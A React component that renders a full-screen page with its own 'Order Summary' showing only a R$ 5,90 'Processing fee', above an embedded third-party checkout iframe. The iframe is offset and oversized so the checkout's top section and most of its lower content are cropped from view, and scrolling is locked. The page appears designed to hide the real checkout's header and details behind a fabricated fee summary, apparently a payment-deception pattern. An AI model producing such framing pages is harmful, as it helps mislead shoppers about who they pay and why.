import { useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";

const CHECKOUT_BASE_URL = "https://checkout.cooud.com/01KH52NHC02W9XP6SGHQ1DAMXK";

const TOP_CROP = 302;
const BOTTOM_CROP = 9500;
const FEE_SECTION_HEIGHT = 140; // altura da seção de taxa

const Index = () => {
  const [searchParams] = useSearchParams();
  const containerRef = useRef<HTMLDivElement>(null);

  const checkoutUrl = (() => {
    const params = searchParams.toString();
    return params ? `${CHECKOUT_BASE_URL}?${params}` : CHECKOUT_BASE_URL;
  })();

  useEffect(() => {
    document.body.style.overflow = "hidden";
    document.documentElement.style.overflow = "hidden";
    return () => {
      document.body.style.overflow = "";
      document.documentElement.style.overflow = "";
    };
  }, []);

  return (
    <div
      ref={containerRef}
      style={{
        position: "fixed",
        inset: 0,
        overflow: "hidden",
        width: "100vw",
        height: "100vh",
        display: "flex",
        flexDirection: "column",
        backgroundColor: "#fff",
      }}
    >
      {/* Seção de resumo do pedido */}
      <div
        style={{
          width: "100%",
          padding: "20px 24px",
          borderBottom: "1px solid #e5e7eb",
          backgroundColor: "#fafafa",
          flexShrink: 0,
        }}
      >
        <h2
          style={{
            fontSize: "16px",
            fontWeight: 700,
            color: "#111",
            marginBottom: "14px",
            letterSpacing: "-0.01em",
          }}
        >
          Order Summary
        </h2>
        <div
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            marginBottom: "10px",
          }}
        >
          <span style={{ fontSize: "14px", color: "#555" }}>Processing fee</span>
          <span style={{ fontSize: "14px", color: "#555" }}>R$ 5,90</span>
        </div>
        <div
          style={{
            borderTop: "1px solid #e5e7eb",
            paddingTop: "10px",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <span style={{ fontSize: "15px", fontWeight: 600, color: "#111" }}>Total</span>
          <span style={{ fontSize: "15px", fontWeight: 600, color: "#111" }}>R$ 5,90</span>
        </div>
      </div>

      {/* Iframe do checkout */}
      <div
        style={{
          position: "relative",
          flex: 1,
          overflow: "hidden",
        }}
      >
        <iframe
          src={checkoutUrl}
          title="Checkout"
          style={{
            position: "absolute",
            top: `-${TOP_CROP}px`,
            left: 0,
            width: "100%",
            height: `calc(100% + ${TOP_CROP + BOTTOM_CROP}px)`,
            border: "none",
          }}
          allow="payment *; clipboard-write"
          sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-popups-to-escape-sandbox"
        />
      </div>
    </div>
  );
};

export default Index;
